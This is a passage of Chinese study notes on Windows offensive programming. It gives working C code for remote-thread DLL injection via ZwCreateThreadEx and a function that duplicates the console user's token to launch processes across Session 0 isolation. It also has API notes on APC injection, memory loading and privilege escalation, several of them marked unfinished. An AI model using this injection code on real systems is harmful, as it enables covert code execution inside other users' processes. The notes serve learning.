<h3 id="实现-2">实现</h3>
<p>跟上面的差不多</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* typedef_ZwCreateThreadEx)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	PHANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">	HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">	ULONG CreateThreadFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">	SIZE_T ZeroBits,</span></span></span><br><span class="line"><span class="params"><span class="function">	SIZE_T StackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">	SIZE_T MaximumStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID pUnkown)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">ZwCreateThreadExInjectDLL</span><span class="params">(DWORD dwProcssId, <span class="keyword">char</span>* pszDLLFileName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hProcess = <span class="literal">NULL</span>;</span><br><span class="line">	SIZE_T dwSize = <span class="number">0</span>;</span><br><span class="line">	LPVOID pDLLAddr = <span class="literal">NULL</span>;</span><br><span class="line">	FARPROC pFuncProcAddr = <span class="literal">NULL</span>;</span><br><span class="line">	HANDLE hRemoteThread = <span class="literal">NULL</span>;</span><br><span class="line">	HMODULE hNtdll = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="comment">//PROCESS_ALL_ACCESS: 进程对象的所有可能访问权限</span></span><br><span class="line">	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcssId);</span><br><span class="line">	<span class="keyword">if</span> (!hProcess)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;OpenProcess Error\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	dwSize = <span class="number">1</span> + <span class="built_in">strlen</span>(pszDLLFileName);</span><br><span class="line">	<span class="comment">//MEM_COMMIT: 为指定的保留内存页面分配内存，初始化为0</span></span><br><span class="line">	pDLLAddr = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (!pDLLAddr)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;VirtualAllocEx Error\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (FALSE == WriteProcessMemory(hProcess, pDLLAddr, pszDLLFileName, dwSize, <span class="literal">NULL</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;WriteProcessMemory Error\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	hNtdll = LoadLibrary(<span class="string">L&quot;ntdll.dll&quot;</span>);</span><br><span class="line">	pFuncProcAddr = GetProcAddress(GetModuleHandle(<span class="string">L&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (!pFuncProcAddr)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;GetProcAddress Error\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	typedef_ZwCreateThreadEx ZwCreateThreadEx = (typedef_ZwCreateThreadEx)GetProcAddress(hNtdll, <span class="string">&quot;ZwCreateThreadEx&quot;</span>);</span><br><span class="line"></span><br><span class="line">	DWORD status = ZwCreateThreadEx(&amp;hRemoteThread, PROCESS_ALL_ACCESS, <span class="literal">NULL</span>, hProcess, (LPTHREAD_START_ROUTINE)pFuncProcAddr, pDLLAddr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="comment">//hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pFuncProcAddr, pDLLAddr, 0, NULL);</span></span><br><span class="line">	CloseHandle(hProcess);</span><br><span class="line">	FreeLibrary(hNtdll);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这如果想通过MessageBox判断是否注入成功，会失败。由于会话隔离，在系统程序中不能显示程序窗体，也不能用常规方式来建立用户进程。可以使用cs的dll来判断注入是否成功。为了解决服务层和用户层交互的问题，微软设计了一系列以WTS(windows terminal service)开头的API来实现这些功能，下面几章会写。</p>
<h2 id="apc注入未完成">APC注入(未完成)</h2>
<p>APC(Asynchronous Procedure Calls)异步过程调用，<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-callss">微软 APC</a></p>
<blockquote>
<p>每个线程都有自己的 APC 队列。应用程序通过调用QueueUserAPC函数将 APC 排队到线程中。调用线程在对QueueUserAPC的调用中指定 APC 函数的地址。APC的排队是线程调用APC函数的请求。</p>
<p>当用户模式 APC 排队时，它排队的线程不会被定向调用 APC 函数，除非它处于警报状态。线程在调用SleepEx、SignalObjectAndWait、MsgWaitForMultipleObjectsEx、WaitForMultipleObjectsEx或WaitForSingleObjectEx函数时进入警报状态。如果在 APC 排队之前等待满足，则线程不再处于警报等待状态，因此不会执行 APC 函数。但是，APC 仍然在排队，因此当线程调用另一个可警报等待函数时，将执行 APC 函数。</p>
</blockquote>
<h3 id="api-3">API</h3>
<h4 id="queueuserapc">QueueUserAPC</h4>
<p>将用户模式<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls">异步过程调用</a>(APC) 对象添加到指定线程的 APC 队列。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">QueueUserAPC</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PAPCFUNC  pfnAPC,<span class="comment">//APC函数指针</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in] HANDLE    hThread,<span class="comment">//线程句柄，必须包含THREAD_SET_CONTEXT访问权限</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in] ULONG_PTR dwData<span class="comment">//传递给APC函数的参数，单个值</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>
<h4 id="createtoolhelp32snapshot">CreateToolhelp32Snapshot</h4>
<p>拍摄指定进程的快照，以及这些进程使用的堆、模块和线程。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateToolhelp32Snapshot</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] DWORD dwFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] DWORD th32ProcessID<span class="comment">//进程标识符，0表示当前进程</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>
<h4 id="process32first">Process32First</h4>
<p>第一个进程信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">Process32First</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]      HANDLE           hSnapshot,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, out] LPPROCESSENTRY32 lppe<span class="comment">//指向 PROCESSENTRY32结构的指针</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>
<h3 id="实现-3">实现</h3>
<p>一个进程有多个线程，为了确保能够执行插入的APC，需要向每个线程都插入APC。</p>
<p>具体流程：</p>
<ol type="1">
<li></li>
</ol>
<h1 id="启动">启动</h1>
<p>三部分：</p>
<ol type="1">
<li>创建进程API</li>
<li>突破SESSION0隔离创建进程</li>
<li>内存加载直接执行</li>
</ol>
<h2 id="创建进程api">创建进程API</h2>
<p>Windows常用3个创建进程的API</p>
<ul>
<li>WinExec</li>
<li>ShellExecute</li>
<li>CreateProcess</li>
</ul>
<h3 id="api-4">API</h3>
<h4 id="winexec">WinExec</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">UINT <span class="title">WinExec</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] LPCSTR lpCmdLine,<span class="comment">//文件名+参数</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in] UINT   uCmdShow<span class="comment">//显示选项</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>返回值：</p>
<ul>
<li>成功：返回值大于31</li>
</ul>
<h4 id="shellexecutea">ShellExecuteA</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HINSTANCE <span class="title">ShellExecuteA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] HWND   hwnd,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] LPCSTR lpOperation,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           LPCSTR lpFile,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] LPCSTR lpParameters,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] LPCSTR lpDirectory,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           INT    nShowCmd</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;s</span><br></pre></td></tr></table></figure>
<p>返回值：</p>
<ul>
<li>成功：返回值大于31</li>
</ul>
<h4 id="createprocessa">CreateProcessA</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CreateProcessA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPCSTR                lpApplicationName,<span class="comment">//程序名称</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in, out, optional] LPSTR                 lpCommandLine,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,<span class="comment">//指向 SECURITY_ATTRIBUTES结构的指针</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,<span class="comment">//指向 SECURITY_ATTRIBUTES结构的指</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                BOOL                  bInheritHandles,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                DWORD                 dwCreationFlags,<span class="comment">//控制优先级和进程创建的标志</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPVOID                lpEnvironment,<span class="comment">//指向新进程的环境块的指针。</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPCSTR                lpCurrentDirectory,<span class="comment">//当前进程完整目录</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                LPSTARTUPINFOA        lpStartupInfo,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]               LPPROCESS_INFORMATION lpProcessInformation</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>
<h3 id="实现-4">实现</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ExecTest</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* pszFileName)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	UINT a = WinExec(pszFileName, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ShellExecuteTest</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* pszFileName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HINSTANCE hInstance = ShellExecuteA(<span class="literal">NULL</span>, <span class="literal">NULL</span>, pszFileName, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateProcessTest</span><span class="params">(<span class="keyword">char</span>* pszFileName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	STARTUPINFO si = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	PROCESS_INFORMATION pi;</span><br><span class="line">	si.cb = <span class="keyword">sizeof</span>(si);</span><br><span class="line">	si.dwFlags = STARTF_USESHOWWINDOW;</span><br><span class="line">	si.wShowWindow = SW_SHOWNORMAL;</span><br><span class="line">	BOOL res = CreateProcessA(<span class="literal">NULL</span>,pszFileName, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, CREATE_NEW_CONSOLE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line">	<span class="keyword">if</span> (res == TRUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;true\n&quot;</span>);</span><br><span class="line">		CloseHandle(pi.hProcess);</span><br><span class="line">		CloseHandle(pi.hThread);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;false&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<h2 id="突破session-0隔离创建用户进程">突破SESSION 0隔离创建用户进程</h2>
<p>SESSION 0的内容见上文，为了解决服务层和用户层交互的问题，微软设计了一系列以WTS(windows terminal service)开头的API来实现这些功能。</p>
<h3 id="api-5">API</h3>
<h4 id="wtsgetactiveconsolesessionid">WTSGetActiveConsoleSessionId</h4>
<p>检索控制台会话的会话标识符。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">WTSGetActiveConsoleSessionId</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>
<h4 id="wtsqueryusertoken">WTSQueryUserToken</h4>
<p>获取会话 ID 指定的登录用户的主要访问令牌。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">WTSQueryUserToken</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  ULONG   SessionId,<span class="comment">//远程桌面服务会话标识符。</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [out] PHANDLE phToken</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>
<h4 id="duplicatetokenex">DuplicateTokenEx</h4>
<p>创建一个复制现有令牌的新<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/desktop/SecGloss/a-gly">访问令牌。</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">DuplicateTokenEx</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           HANDLE                       hExistingToken,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           DWORD                        dwDesiredAccess,<span class="comment">//指定新令牌的请求访问权限</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] LPSECURITY_ATTRIBUTES        lpTokenAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           TOKEN_TYPE                   TokenType,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]          PHANDLE                      phNewToken</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>
<h4 id="createenvironmentblock">CreateEnvironmentBlock</h4>
<p>检索指定用户的环境变量。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CreateEnvironmentBlock</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]          LPVOID *lpEnvironment,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] HANDLE hToken,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           BOOL   bInherit</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>
<h4 id="createprocessasusera">CreateProcessAsUserA</h4>
<p>创建一个新进程及其主线程。新进程在由指定令牌表示的用户的安全上下文中运行。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CreateProcessAsUserA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      HANDLE                hToken,<span class="comment">//用户的主令牌的句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPCSTR                lpApplicationName,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, out, optional] LPSTR                 lpCommandLine,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                BOOL                  bInheritHandles,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                DWORD                 dwCreationFlags,<span class="comment">//控制优先级和进程创建的标志。</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPVOID                lpEnvironment,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPCSTR                lpCurrentDirectory,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                LPSTARTUPINFOA        lpStartupInfo,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]               LPPROCESS_INFORMATION lpProcessInformation</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>
<h3 id="实现-5">实现</h3>
<p>首先使用<code>WTSGetActiveConsoleSessionId</code>获取当前sessionID，之后调用<code>WTSQueryUserToken</code>返回用户令牌句柄，之后使用<code>DuplicateToken</code>创建新的令牌，并复制上面获取的用户令牌，之后使用<code>CreateEnvironmentBlock</code>创建一个环境块，再之后就是调用<code>CreateProcessAsUserA</code>创建</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">createUserProcess</span><span class="params">(<span class="keyword">char</span>* pszFileName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD dwSessionId;</span><br><span class="line">	HANDLE hToken = <span class="literal">NULL</span>;</span><br><span class="line">	HANDLE hDuplicatedToken = <span class="literal">NULL</span>;</span><br><span class="line">	LPVOID lpEnvironment = <span class="literal">NULL</span>;</span><br><span class="line">	STARTUPINFO si = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	si.cb = <span class="keyword">sizeof</span>(si);</span><br><span class="line">	<span class="comment">// 获得当前Session ID</span></span><br><span class="line">	dwSessionId = WTSGetActiveConsoleSessionId();</span><br><span class="line">	<span class="comment">// 获得当前Session的用户令牌</span></span><br><span class="line">	<span class="keyword">if</span> (WTSQueryUserToken(dwSessionId, &amp;hToken) == FALSE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;WTSGetActiveConsoleSessionId Error\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 复制令牌</span></span><br><span class="line">	<span class="keyword">if</span> (FALSE == DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, <span class="literal">NULL</span>, SecurityIdentification, TokenPrimary, &amp;hDuplicatedToken))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;DuplicateTokenEx Error\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 创建用户Session环境</span></span><br><span class="line">	<span class="keyword">if</span> (FALSE == CreateEnvironmentBlock(&amp;lpEnvironment, hDuplicatedToken, FALSE))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;CreateEnvironmentBlock Error\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (FALSE == CreateProcessAsUser(hDuplicatedToken, (LPCWSTR)pszFileName, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE,</span><br><span class="line">		NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT,</span><br><span class="line">		lpEnvironment, <span class="literal">NULL</span>, &amp;si, &amp;pi))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;CreateProcessAsUser Error\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (lpEnvironment)</span><br><span class="line">		DestroyEnvironmentBlock(lpEnvironment);</span><br><span class="line">	<span class="keyword">if</span> (hDuplicatedToken)</span><br><span class="line">		CloseHandle(hDuplicatedToken);</span><br><span class="line">	<span class="keyword">if</span> (hToken)</span><br><span class="line">		CloseHandle(hToken);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>要实现突破SESSION 0隔离的话，必须将程序注册为一个系统服务进程 ，这样才在SESSION 0中，服务程序的入口点和普通的程序不同，需要调用<code>StartServiceCtrlDispatcher</code>函数来设置服务入口点函数，这里不写了，见<a target="_blank" rel="noopener" href="https://github.com/jash-git/Windows-Hack-Programming-backup/blob/master/WINDOWS%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF%E8%AF%A6%E8%A7%A3-%E9%85%8D%E5%A5%97%E8%B5%84%E6%BA%90/%E7%94%A8%E6%88%B7%E5%B1%82/4/%E7%AA%81%E7%A0%B4SESSION%200%E9%9A%94%E7%A6%BB%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%E8%BF%9B%E7%A8%8B/CreateProcessAsUser_Test/CreateProcessAsUser_Test/CreateProcessAsUser_Test.cpp">代码</a>。</p>
<h2 id="内存加载执行未完成">内存加载执行(未完成)</h2>
<p>就是把程序放到内存执行，不需要<code>LoadLibrary</code>，需要PE的知识。</p>
<p>代码见：<a target="_blank" rel="noopener" href="https://github.com/jash-git/Windows-Hack-Programming-backup/blob/master/WINDOWS%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF%E8%AF%A6%E8%A7%A3-%E9%85%8D%E5%A5%97%E8%B5%84%E6%BA%90/%E7%94%A8%E6%88%B7%E5%B1%82/4/%E5%86%85%E5%AD%98%E7%9B%B4%E6%8E%A5%E5%8A%A0%E8%BD%BD%E8%BF%90%E8%A1%8C/RunDllInMem_Test/RunDllInMem_Test/MmLoadDll.cpp">代码</a></p>
<h1 id="提权技术bypass-uac部分未完成">提权技术(Bypass UAC部分未完成)</h1>
<p>主要是两种：</p>
<ol type="1">
<li>进程访问令牌权限提升</li>
<li>Bypass UAC</li>
</ol>
<h2 id="进程访问令牌权限提升">进程访问令牌权限提升</h2>
<h3 id="api-6">API</h3>
<h4 id="openprocesstoken">OpenProcessToken</h4>
<p>打开与进程关联的<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/desktop/SecGloss/a-gly">访问令牌</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">OpenProcessToken</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  HANDLE  ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  DWORD   DesiredAccess,<span class="comment">//指定一个访问掩码</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [out] PHANDLE TokenHandle</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>
<h4 id="lookupprivilegevalue">LookupPrivilegeValue</h4>
<p>查看系统权限的特权值，返回LUID结构体</p>
